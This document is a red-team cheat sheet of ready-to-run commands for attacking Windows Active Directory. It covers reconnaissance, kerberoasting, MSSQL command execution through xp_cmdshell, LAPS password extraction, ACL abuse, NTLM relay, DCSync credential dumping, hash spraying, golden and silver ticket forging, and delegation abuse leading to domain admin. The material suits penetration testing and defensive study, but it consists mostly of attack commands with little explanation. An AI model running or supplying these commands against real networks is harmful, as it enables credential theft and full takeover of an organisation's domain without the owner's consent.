# Active Directory

## Reconnaissance

### Computers
```powershell (PowerView)
Get-NetComputer -Properties samaccountname, samaccounttype, operatingsystem
```

### Groups
```powershell (PowerView)
Get-NetGroup -Domain <domain> | select name
```

```powershell (PowerView)
Get-DomainGroupMember "<group>" -Recurse
```

### User
```powershell (PowerView)
Get-DomainUser
```

### Shares
```powershell (PowerView)
Find-DomainShare -CheckShareAccess
```

### Kerberos
* unconstrained delegation
```powershell (PowerView)
Get-DomainComputer -Unconstrained
```

* constrained delegation
```powershell (PowerView)
Get-DomainUser -TrustedToAuth
Get-DomainComputer -TrustedToAuth
```

* resource-based constrained delegation
```powershell (PowerView)
Get-DomainComputer | Get-ObjectAcl -ResolveGUIDs | Foreach-Object {$_ | Add-Member -NotePropertyName Identity -NotePropertyValue (ConvertFrom-SID $_.SecurityIdentifier.value) -Force; $_} | Foreach-Object {if ($_.Identity -eq $("$env:UserDomain\$env:Username")) {$_}}
```

```powershell (PowerView)
Get-DomainObject -Identity prod -Properties ms-DS-MachineAccountQuota
```


* kerberoast
```powershell (PowerView)
Get-DomainUser * -SPN | Get-DomainSPNTicket -Format Hashcat | Export-Csv C:\Windows\Temp\kerberoast.csv -NoTypeInformation
```

* AS-REP roast
```bash
impacket-GetNPUsers -request -dc-ip <dc> <domain>/<user> -hashes ':<ntlm>'
```

### MSSQL

* impersonation
list user
```mssql
SELECT name FROM sys.server_principals WHERE type_desc != 'SERVER_ROLE';
```

```cmd (redteam-seashell.exe)
SEA> sysusers
```

impersonate
```mssql
EXECUTE AS LOGIN = '<sysuser>';
```

```cmd (redteam-seashell.exe)
SEA> impersonate <sysuser>
```

* UNC Path Injection

force SMB access to the MSSQL server
```mssql
EXEC master..xp_dirtree "\\192.168.1.1\test";
```

```cmd (redteam-seashell.exe)
.\redteam-seashell.exe
SEA> unc \\192.168.1.1\test
```

* Command Execution

1. setup `xp_cmdshell`
```mssql
EXEC sp_configure 'show advanced options', 1; RECONFIGURE;
EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE;
```

```cmd (redteam-seashell.exe)
SEA> xpenable
```

2. execute command
```mssql
EXEC xp_cmdshell '<command>'
```

```cmd (redteam-seashell.exe)
SEA> xpcmd <command>
```

* Enable RPC

enable RPC for specified host
```mssql
EXEC sp_serveroption '<host>','rpc out','true';
```

```cmd
.\redteam-seashell.exe
SEA> rpcenable <host>
```

### Sensitive Information

* LAPS password
```powershell
Get-DomainObject <hostname> -Properties "ms-mcs-AdmPwd",name
```

### BloodHound

* collect
```powershell
Import-Module SharpHound.ps1
Invoke-BloodHound -c all -d <domain> -outputdirectory <dir>
```

```cmd
SharpHound.exe -c all -d <domain> --outputdirectory <dir>
```

* analyze
```bash
sudo neo4j start
bloodhound
```

## Privilege Escalation

### GenericAll
* group
```
net user <group> <user> /domain 
```

### WriteDacl
* add `GenericAll` right over `<target object>` to `<base object>`
```powershell (PowerView)
Add-DomainObjectAcl -TargetIdentity <target object> -PrincipalIdentity <base object> -Rights All
```

### ForcePasswordChange
```
$UserPassword = ConvertTo-SecureString '<password>' -AsPlainText -Force
Set-DomainUserPassword -Identity nina -AccountPassword $UserPassword -Credential $Cred
```

### Printer Bug to Domain Admin
* Condition
- unconstrained delegation host is compromised
- print spoofer is running at target host
    ```powershell
    dir \\target\pipe\spoolss
    ```

* Execution
1. monitor kerberos ticket with `Rubeus`
```cmd
.\Rubeus.exe monitor /interval:5 /nowrap
```

2. run `SpoolSamle` to invoke printer servive
```cmd
.\SpoolSample.exe <target> <compromised>
```
now base64 encoded ticket should appear at `Rubeus` console

3. load ticket
```cmd
.\Rubeus.exe ptt /ticket:<base64 encoded ticket>
```

## Lateral Movement

### NTLM relay

* invocation methods
- UNC Path Injection
- HTTP access by Phishing
- WebDAV

```
impacket-ntlmrelayx -t 192.168.1.1 -smb2support -c <cmd>
```

### Credential Gathering
* DCSync
```mimikatz
lsadump::dcsync /domain:<domain FQDN> /user:<domain>\<user>
```

### Password Splay
* SMB domain auth with hash
```
nxc smb <hosts> -d <domain> -u <users> -H <hashes> --continue-on-success
```

* SMB local Administrator with hash
```
nxc smb <hosts> -u Administrator -H <hashes> --continue-on-success --local-auth
```

### Silver Ticket
```cmd (mimikatz)
kerberos::golden /domain:domain /sid:<domain sid> /service:<service> /target:<target> /user:<user> /rc4:<ntlm> /ptt
```

### Golden Ticket
```cmd (mimikatz)
kerberos::golden /user:Administrator /domain:<domain> /SID:<domain sid> /rc4:<ntlm> /target:<target> /ptt
```

### Unconstrained Delegation
#### Condition
- `useraccountcontrol` is set to `TRUSTED_FOR_DELEGATION`

#### Execution
* in case there is a ticket of high value user
1. export the ticket
```mimikatz
sekurlsa::tickets /export
```

2. pass the ticket
```mimikatz
kerberos::ptt <kirbi>
```

3. abuse ticket
```cmd
.\PsExec.exe \\<host> cmd
```


* in case named pipe of host is accessible
1. check pipe access
```powershell
dir \\<target_host>\pipe\spoolss
```

2. setup Rubeus monitor
```cmd
.\Rubeus.exe monitor /interval:5 /filteruser:<target_host>$ /nowrap
```

3. invoke print spooler
```cmd
.\SpoolSample.exe <target_host> <monitor_host>
```

4. pass the ticket
```
.\Rubeus.exe ptt /ticket:<ticket>
```

### Constrained Delegation
#### Condition
- compromised user has `msds-AllowedTodDlegateTo` property

##### Execution
1. get a silver ticket and inject
```sh
impacket-getST -spn <spn> -impersonate Administrator <domain>/<user>:<password> -dc-ip <dc>
```

```sh
export KRB5CCNAME=<ccache>
```

2. abuse ticket
* psexec
```sh
impacket-psexec <domain>/Administrator@<host> -k -no-pass -dc-ip <dc> -target-ip <target>
```


### Resource-Based Constrained Delegation
* Condition
- `msDS-AllowedToActOnBehalfOfOtherIdentity` is writable. (e.g. `GenericWrite` on machine object)
- host with SPN is compromised, or a computer can be added

* Execution
1. add a computer account
```powershell (PowerMad)
New-MachineAccount -MachineAccount myComputer -Password $(ConvertTo-SecureString 'password' -AsPlainText -Force)
```

```bash
impacket-addcomputer -computer-name 'myComputer$' -computer-pass 'password' <domain>/<user> -hashes :<hash> -dc-ip <dc>
```

* kerberos
```bash
impacket-addcomputer -computer-name 'myComputer$' -computer-pass 'password' <domain>/<user> -dc-ip <dc ip> -k -no-pass -dc-host <dc host>
```

2. get security descriptor
```powershell (PowerView)
$sid =Get-DomainComputer -Identity myComputer -Properties objectsid | Select -Expand objectsid
$SD = New-Object Security.AccessControl.RawSecurityDescriptor -ArgumentList "O:BAD:(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;$($sid))"
$SDbytes = New-Object byte[] ($SD.BinaryLength)
$SD.GetBinaryForm($SDbytes,0)
```

```bash
skip
```

3. write security descriptor to `msDS-AllowedToActOnBehalfOfOtherIdentity` of target host
```powershell (PowerView)
Get-DomainComputer -Identity <host> | Set-DomainObject -Set @{'msds-allowedtoactonbehalfofotheridentity'=$SDBytes}
```

```bash
impacket-rbcd -action write -delegate-to 'TARGET$' -delegate-from 'myComputer$' <domain>/'MACHINE$' -hashes :<hash> -dc-ip <dc>
```

* kerberos
```bash
vim /etc/hosts
172.16.1.1 DC01

impacket-rbcd -action write -delegate-to 'TARGET$' -delegate-from 'myComputer$' <domain>/<user>  -k -no-pass -dc-ip <dc>
```

4. convert password to hash
```cmd
.\Rubeus.exe hash /password:password
```

5. get TGT for target host
```cmd
.\Rubeus.exe s4u /user:myComputer$ /rc4:<hash> /impersonateuser:administrator /msdsspn:CIFS/<host> /ptt
```

```bash
impacket-getST -spn cifs/<target> -impersonate administrator '<domain>/myComputer$:password' -dc-ip <dc>
```

:::note alert
KRB5CCNAME would be used even without `-k` flag. Open another shell.
:::